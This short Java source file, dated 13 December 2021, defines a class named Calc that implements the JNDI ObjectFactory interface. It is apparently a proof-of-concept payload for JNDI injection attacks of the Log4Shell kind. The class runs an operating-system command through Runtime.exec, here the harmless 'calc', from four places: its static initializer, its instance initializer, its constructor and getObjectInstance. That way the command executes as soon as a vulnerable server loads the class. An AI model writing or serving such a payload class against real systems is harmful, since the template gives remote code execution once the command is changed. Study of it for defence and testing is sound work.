package com.lqz;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * @author liaoqinzhou_sz
 * @version 1.0.0
 * @Description TODO
 * @createTime 2021年12月13日 15:34:00
 */
public class Calc implements ObjectFactory {
    {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"calc"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }

    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"calc"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Calc() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"calc"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"calc"};
        Process pc = rt.exec(commands);
        pc.waitFor();
        return null;
    }
}